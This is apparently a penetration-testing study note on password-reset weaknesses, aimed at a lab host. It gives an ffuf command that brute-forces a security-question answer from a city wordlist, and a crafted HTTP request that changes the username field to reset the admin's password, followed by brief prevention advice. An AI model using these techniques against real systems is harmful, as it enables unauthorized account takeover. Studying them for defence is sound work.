# Vulnerable Password Reset

* Password reset functionalities can be exploited through various vulnerabilities, including brute-forcing tokens and business logic flaws, even with protections like rate limiting and CAPTCHAs.

**Guessable Password Reset Questions:**

* Many applications use security questions for password recovery, which often have predictable answers.
* Common questions include:
  * "What is your mother's maiden name?"
  * "What city were you born in?"
* These questions can be guessed or found through OSINT, making them weak points in security.

**Brute-Forcing Security Questions:**

* If a web application uses a question like "What city were you born in?", attackers can brute-force the answer using a wordlist of cities.
*   Example command to create a city wordlist from a [CSV](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) file:

    {% code overflow="wrap" %}
    ```bash
    cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
    wc -l city_wordlist.txt  # Results in 26,468 cities
    ```
    {% endcode %}
*   To perform the brute-force attack, use a tool like `ffuf`:

    {% code overflow="wrap" %}
    ```bash
    ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
    ```
    {% endcode %}
* If additional information about the target is known (e.g., location), the wordlist can be narrowed down to improve efficiency.

**Manipulating the Reset Request:**

* Another vulnerability arises when users can manipulate parameters in the password reset process.
* Example flow:
  1. Specify the username for the reset.
  2. Supply the answer to the security question.
  3. Reset the password using the username parameter, which can be manipulated to target different accounts.
*   Example of a manipulated request to reset another user's password:

    ```http
    POST /reset_password.php HTTP/1.1
    Host: pwreset.htb
    Content-Length: 32
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

    password=P@$w0rd&username=admin
    ```

**Prevention:**

* Ensure consistent state verification throughout the password reset process to prevent unauthorized access.
* Implement robust checks to ensure that the username in the reset request matches the authenticated user.
* Regularly review and test password reset functionalities for potential security issues to safeguard against account takeovers.
